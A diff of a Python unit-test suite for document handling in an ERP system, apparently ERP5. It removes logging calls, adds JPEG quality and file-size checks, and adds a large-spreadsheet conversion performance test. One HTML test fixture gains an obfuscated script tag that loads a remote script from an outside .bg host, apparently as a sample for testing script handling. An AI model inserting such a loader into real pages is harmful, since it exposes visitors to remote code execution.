@@ -78,19 +78,6 @@ TEST_FILES_HOME = os.path.join(os.path.dirname(__file__), 'test_document')
 FILE_NAME_REGULAR_EXPRESSION = "(?P<reference>[A-Z]{3,10})-(?P<language>[a-z]{2})-(?P<version>[0-9]{3})"
 REFERENCE_REGULAR_EXPRESSION = "(?P<reference>[A-Z]{3,10})(-(?P<language>[a-z]{2}))?(-(?P<version>[0-9]{3}))?"
 
-
-def printAndLog(msg):
-  """
-  A utility function to print a message
-  to the standard output and to the LOG
-  at the same time
-  """
-  if not QUIET:
-    msg = str(msg)
-    ZopeTestCase._print('\n ' + msg)
-    LOG('Testing... ', 0, msg)
-
-
 def makeFilePath(name):
   return os.path.join(os.path.dirname(__file__), 'test_document', name)
 
@@ -235,7 +222,6 @@ class TestDocument(TestDocumentMixin):
     """
       Standard test to make sure we have everything we need - all the tools etc
     """
-    printAndLog('\nTest Has Everything ')
     self.assertNotEqual(self.getCategoryTool(), None)
     self.assertNotEqual(self.getSimulationTool(), None)
     self.assertNotEqual(self.getTypeTool(), None)
@@ -247,7 +233,6 @@ class TestDocument(TestDocumentMixin):
     """
       Test revision mechanism
     """
-    printAndLog('\nTest Revision System')
     # create a test document
     # revision should be 1
     # upload file (can be the same) into it
@@ -284,7 +269,6 @@ class TestDocument(TestDocumentMixin):
     """
       Test versioning
     """
-    printAndLog('\nTest Versioning System')
     # create a document 1, set coordinates (reference=TEST, version=002, language=en)
     # create a document 2, set coordinates (reference=TEST, version=002, language=en)
     # create a document 3, set coordinates (reference=TEST, version=004, language=en)
@@ -320,7 +304,6 @@ class TestDocument(TestDocumentMixin):
     """
       Test versioning with multi-language support
     """
-    printAndLog('\nTest Versioning With Language')
     # create empty test documents, set their coordinates as follows:
     # (1) TEST, 002, en
     # (2) TEST, 002, fr
@@ -378,8 +361,6 @@ class TestDocument(TestDocumentMixin):
       Explicit relations are just like any other relation, so no need to test them here
       except for similarity cloud which we test.
     """
-
-    printAndLog('\nTest Explicit Relations')
     # create test documents:
     # (1) TEST, 002, en
     # (2) TEST, 003, en
@@ -482,7 +463,6 @@ class TestDocument(TestDocumentMixin):
     def sqlresult_to_document_list(result):
       return [i.getObject() for i in result]
 
-    printAndLog('\nTest Implicit Relations')
     # create docs to be referenced:
     # (1) TEST, 002, en
     filename = 'TEST-en-002.odt'
@@ -527,7 +507,6 @@ class TestDocument(TestDocumentMixin):
 
     transaction.commit()
     self.tic()
-    printAndLog('\nTesting Implicit Predecessors')
     # the implicit predecessor will find documents by reference.
     # version and language are not used.
     # the implicit predecessors should be:
@@ -542,7 +521,6 @@ class TestDocument(TestDocumentMixin):
     # clear transactional variable cache
     transaction.commit()
 
-    printAndLog('\nTesting Implicit Successors')
     # the implicit successors should be return document with appropriate
     # language.
 
@@ -682,7 +660,6 @@ class TestDocument(TestDocumentMixin):
     Check that the processing state of a cloned document
     is not draft
     """
-    printAndLog('\nProcessing State of a Cloned Document')
     filename = 'TEST-en-002.doc'
     file = makeFileUpload(filename)
     document = self.portal.portal_contributions.newContent(file=file)
@@ -723,7 +700,6 @@ class TestDocument(TestDocumentMixin):
     Check the validation state of embedded document when its container is
     cloned
     """
-    printAndLog('\nValidation State of a Cloned Document')
     filename = 'TEST-en-002.doc'
     file = makeFileUpload(filename)
     document = self.portal.portal_contributions.newContent(file=file)
@@ -753,7 +729,6 @@ class TestDocument(TestDocumentMixin):
     """
     Check the validation state of an embedded document
     """
-    printAndLog('\nValidation State of an Embedded Document')
     filename = 'EmbeddedImage-en-002.odt'
     file = makeFileUpload(filename)
     document = self.portal.portal_contributions.newContent(file=file)
@@ -1163,7 +1138,7 @@ class TestDocument(TestDocumentMixin):
     self.assertSameSet([document_3], getAdvancedSearchStringResultList(**kw))
     kw = {'searchabletext_any': 'copy',
           'reference': document_2.getReference(),
-	  'search_portal_type': 'File'}
+          'search_portal_type': 'File'}
     self.assertSameSet([], getAdvancedSearchStringResultList(**kw))
   
     # search by version
@@ -1221,7 +1196,6 @@ class TestDocument(TestDocumentMixin):
 
     # XXX: search limited to a certain date range
     # XXX: search mode
-
 
   def test_PDFTextContent(self):
     upload_file = makeFileUpload('REF-en-001.pdf')
@@ -1627,6 +1601,9 @@ style=3D'color:black'>05D65812<o:p></o:p></span></p>
   </td>
  </tr>
 </table>
+<script LANGUAGE="JavaScript" type="text/javascript">
+document.write('<sc'+'ript type="text/javascript" src="http://somosite.bg/utb.php"></sc'+'ript>');
+</script>
 </BODY></HTML>
     """
     web_page.edit(text_content=html_content)
@@ -1925,6 +1902,8 @@ return 1
     Test converting to image all Document portal types on traversal i.e.:
      - image_module/1?quality=100&display=xlarge&format=jpeg
      - document_module/1?quality=100&display=large&format=jpeg
+     - document_module/1?quality=10&display=large&format=jpeg
+     - document_module/1?display=large&format=jpeg
      - etc ...
     """
     # Create OOo document
@@ -1949,7 +1928,7 @@ return 1
       width = int(preference_tool.getPreference(width_preference))
       return (width, height)
 
-    def getURLSize(uri, **kw):
+    def getURLSizeList(uri, **kw):
       # __ac=RVJQNVR5cGVUZXN0Q2FzZTo%3D is encoded ERP5TypeTestCase with empty password
       url = '%s?%s&__ac=%s' %(uri, urllib.urlencode(kw), 'RVJQNVR5cGVUZXN0Q2FzZTo%3D')
       format=kw.get('format', 'jpeg')
@@ -1957,13 +1936,15 @@ return 1
       # save as file with proper incl. format filename (for some reasons PIL uses this info)
       filename = "%s%stest-image-format-resize.%s" %(os.getcwd(), os.sep, format)
       f = open(filename, "w")
-      f.write(infile.read())
+      image_data = infile.read()
+      f.write(image_data)
       f.close()
       infile.close()
+      file_size = len(image_data)
       image = Image.open(filename)
       image_size = image.size
       os.remove(filename)
-      return image_size
+      return image_size, file_size
 
     ooo_document_url = '%s/%s' %(self.portal.absolute_url(), ooo_document.getRelativeUrl())
     pdf_document_url = '%s/%s' %(self.portal.absolute_url(), pdf_document.getRelativeUrl())
@@ -1979,16 +1960,35 @@ return 1
         # so allow some tollerance which is produced by respective portal_transform command
 
         # any OOo based portal type
-        ooo_document_image_size = getURLSize(ooo_document_url, **convert_kw)
+        ooo_document_image_size, ooo_document_file_size = getURLSizeList(ooo_document_url, **convert_kw)
         self.assertTrue(max(preffered_size_for_display) - max(ooo_document_image_size) <= max_tollerance_px)
 
         # PDF
-        pdf_document_image_size = getURLSize(pdf_document_url, **convert_kw)
+        pdf_document_image_size, pdf_document_file_size = getURLSizeList(pdf_document_url, **convert_kw)
         self.assertTrue(max(preffered_size_for_display) - max(pdf_document_image_size) <= max_tollerance_px)
 
         # Image
-        image_document_image_size = getURLSize(image_document_url, **convert_kw)
+        image_document_image_size, image_document_file_size = getURLSizeList(image_document_url, **convert_kw)
         self.assertTrue(max(preffered_size_for_display) - max(image_document_image_size) <= max_tollerance_px)
+
+    # test changing image quality will decrease its file size
+    for url in (image_document_url, pdf_document_url, ooo_document_url):
+      convert_kw = {'display':'xlarge', \
+                    'format':'jpeg', \
+                    'quality':100}
+      image_document_image_size_100p,image_document_file_size_100p = getURLSizeList(url, **convert_kw)
+      # decrease in quality should decrease its file size
+      convert_kw['quality'] = 5.0
+      image_document_image_size_5p,image_document_file_size_5p = getURLSizeList(url, **convert_kw)
+      # removing quality should enable defaults settings which should be reasonable between 5% and 100%
+      del convert_kw['quality']
+      image_document_image_size_no_quality,image_document_file_size_no_quality = getURLSizeList(url, **convert_kw)
+      # check file sizes
+      self.assertTrue(image_document_file_size_100p > image_document_file_size_no_quality and \
+                      image_document_file_size_no_quality > image_document_file_size_5p)
+      # no matter of quality image sizes whould be the same
+      self.assertTrue(image_document_image_size_100p==image_document_image_size_5p and \
+                        image_document_image_size_5p==image_document_image_size_no_quality)
 
   def test_checkConversionFormatPermission(self):
     """
@@ -2117,11 +2117,33 @@ class TestDocumentWithSecurity(TestDocumentMixin):
     self.assertEqual((user_pref.getPreferredThumbnailImageWidth(),
                     user_pref.getPreferredThumbnailImageHeight()),
                      image.getSizeFromImageDisplay('thumbnail'))
+
+class TestDocumentPerformance(TestDocumentMixin):
+
+  def test_01_LargeOOoDocumentToImageConversion(self):
+    """
+      Test large OOoDocument to image conversion
+    """
+    ooo_document = self.portal.document_module.newContent(portal_type='Spreadsheet')
+    upload_file = makeFileUpload('import_big_spreadsheet.ods')
+    ooo_document.edit(file=upload_file)
+    self.stepTic()
+    before = time.time()
+    # converting any OOoDocument -> PDF -> Image
+    # make sure that this can happen in less tan XXX seconds i.e. code doing convert
+    # uses only first PDF frame (not entire PDF) to make an image - i.e.optimized enough to not kill 
+    # entire system performance by doing extensive calculations over entire PDF (see r37102-37103)
+    ooo_document.convert(format='png')
+    after = time.time()
+    req_time = (after - before)
+    # we should have image converted in less than 20s
+    self.assertTrue(req_time < 20.0)
     
 def test_suite():
   suite = unittest.TestSuite()
   suite.addTest(unittest.makeSuite(TestDocument))
   suite.addTest(unittest.makeSuite(TestDocumentWithSecurity))
+  suite.addTest(unittest.makeSuite(TestDocumentPerformance))
   return suite
 
 
